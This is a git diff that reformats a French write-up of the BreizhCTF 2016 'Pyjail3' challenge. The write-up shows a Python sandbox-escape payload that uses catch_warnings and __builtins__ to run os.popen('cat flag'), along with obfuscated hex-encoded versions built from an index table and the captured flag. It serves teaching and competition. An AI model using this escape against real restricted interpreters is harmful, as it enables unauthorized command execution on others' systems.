@@ -1,5 +1,5 @@
 # BREIZHCTF 2K16
-** Chall:** Pyjail3
+**Chall:** Pyjail3
 **Points:** 300 |
 **Taux de réussite:** 7% |
 
@@ -9,17 +9,18 @@ Dans ce challenge on reste dans la même logique que les deux précédents (sort
 On peut directement eliminé l'approche utilisée pour le pyjail2 car on a plus de moyen d'envoyer une chaine de caractères au programme. Reste l'approche du payjail1, mais celle ci necéssite des caractères non autorisés dans ce chall :/
 
 Après beaucoup de M&Ms et de l'eau du robinet :p 
+
 En listant les outils qu'on a :
- - fonction dir
- - fonction _
- - declaration de variable de type autre que str (a = 2)
+ - La fonction dir
+ - La fonction _
+ - La declaration de variable de type autre que str (a = 2)
 
 L'idée de contruire une chaine de caractères qui sera notre payload pour récupérer le flag semble la plus pertinente, on sait que notre payload est le suivant :
 
-"""
+```
 >wclass = ().__class__.__base__.__subclasses__()[59]()
 >print wclass._module.__builtins__['__import__']('os').popen('cat flag').read()
- """
+ ```
 
 En utilisant la fonction dir on peut instancier un objet de type str :
 ```
@@ -78,7 +79,20 @@ En utilisant le petit programme python 'generator.py' on transforme le code hexa
 
 Initialisation de la variable wcalss : 
 ```
-> _((alphabet[6]+alphabet[6]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+alphabet[1]+alphabet[9]+alphabet[2]+alphabet[13]+alphabet[1]+alphabet[9]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[1]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[5]+alphabet[4]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[4]+alphabet[5]+alphabet[1]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+alphabet[5]+alphabet[4]+alphabet[6]+alphabet[2]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]+alphabet[4]+alphabet[11]+alphabet[2]+alphabet[4]+alphabet[2]+alphabet[8]+alphabet[4]+alphabet[13]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]).decode(hex))	
+> _((alphabet[6]+alphabet[6]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+
+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+alphabet[1]+alphabet[9]+alphabet[2]+alphabet[13]+
+alphabet[1]+alphabet[9]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]+alphabet[1]+alphabet[14]+
+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+
+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+alphabet[4]+alphabet[15]+
+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+
+alphabet[5]+alphabet[1]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[5]+alphabet[4]+
+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+
+alphabet[4]+alphabet[15]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[4]+alphabet[5]+alphabet[1]+
+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+
+alphabet[6]+alphabet[2]+alphabet[5]+alphabet[4]+alphabet[6]+alphabet[2]+alphabet[4]+alphabet[15]+
+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]+alphabet[4]+alphabet[11]+
+alphabet[2]+alphabet[4]+alphabet[2]+alphabet[8]+alphabet[4]+alphabet[13]+alphabet[1]+alphabet[7]+
+alphabet[1]+alphabet[8]).decode(hex))	
 
 >print wclass
 catch_warnings()
@@ -86,7 +100,26 @@ catch_warnings()
 
 Récupération du flag :
 ```
-> _((alphabet[6]+alphabet[9]+alphabet[6]+alphabet[1]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[14]+alphabet[6]+alphabet[3]+alphabet[1]+alphabet[9]+alphabet[6]+alphabet[6]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[13]+alphabet[5]+alphabet[15]+alphabet[5]+alphabet[3]+alphabet[6]+alphabet[4]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[4]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[1]+alphabet[6]+alphabet[4]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[12]+alphabet[6]+alphabet[3]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[14]+alphabet[6]+alphabet[2]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[11]+alphabet[1]+alphabet[6]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[13]+alphabet[6]+alphabet[9]+alphabet[5]+alphabet[15]+alphabet[6]+alphabet[1]+alphabet[6]+alphabet[3]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[6]+alphabet[4]+alphabet[13]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[6]+alphabet[5]+alphabet[15]+alphabet[6]+alphabet[2]+alphabet[1]+alphabet[6]+alphabet[1]+alphabet[8]+alphabet[1]+alphabet[14]+alphabet[6]+alphabet[9]+alphabet[5]+alphabet[15]+alphabet[6]+alphabet[9]+alphabet[5]+alphabet[4]+alphabet[5]+alphabet[14]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[6]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[3]+alphabet[1]+alphabet[9]+alphabet[5]+alphabet[5]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[5]+alphabet[6]+alphabet[1]+alphabet[6]+alphabet[1]+alphabet[8]+alphabet[1]+alphabet[14]+alphabet[6]+alphabet[1]+alphabet[5]+alphabet[4]+alphabet[5]+alphabet[0]+alphabet[5]+alphabet[3]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]).decode(hex))
+> _((alphabet[6]+alphabet[9]+alphabet[6]+alphabet[1]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[14]+
+alphabet[6]+alphabet[3]+alphabet[1]+alphabet[9]+alphabet[6]+alphabet[6]+alphabet[5]+alphabet[2]+
+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+
+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[13]+alphabet[5]+alphabet[15]+
+alphabet[5]+alphabet[3]+alphabet[6]+alphabet[4]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[4]+
+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[1]+
+alphabet[6]+alphabet[4]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[12]+alphabet[6]+alphabet[3]+
+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[14]+alphabet[6]+alphabet[2]+alphabet[4]+alphabet[15]+
+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[11]+alphabet[1]+alphabet[6]+alphabet[4]+alphabet[15]+
+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[13]+alphabet[6]+alphabet[9]+
+alphabet[5]+alphabet[15]+alphabet[6]+alphabet[1]+alphabet[6]+alphabet[3]+alphabet[4]+alphabet[15]+
+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[6]+alphabet[4]+alphabet[13]+alphabet[1]+alphabet[7]+
+alphabet[1]+alphabet[6]+alphabet[5]+alphabet[15]+alphabet[6]+alphabet[2]+alphabet[1]+alphabet[6]+
+alphabet[1]+alphabet[8]+alphabet[1]+alphabet[14]+alphabet[6]+alphabet[9]+alphabet[5]+alphabet[15]+
+alphabet[6]+alphabet[9]+alphabet[5]+alphabet[4]+alphabet[5]+alphabet[14]+alphabet[1]+alphabet[7]+
+alphabet[1]+alphabet[6]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[3]+
+alphabet[1]+alphabet[9]+alphabet[5]+alphabet[5]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+
+alphabet[5]+alphabet[6]+alphabet[1]+alphabet[6]+alphabet[1]+alphabet[8]+alphabet[1]+alphabet[14]+
+alphabet[6]+alphabet[1]+alphabet[5]+alphabet[4]+alphabet[5]+alphabet[0]+alphabet[5]+alphabet[3]+
+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]).decode(hex))
 
 BZH{wow super flag \o/}
 ```
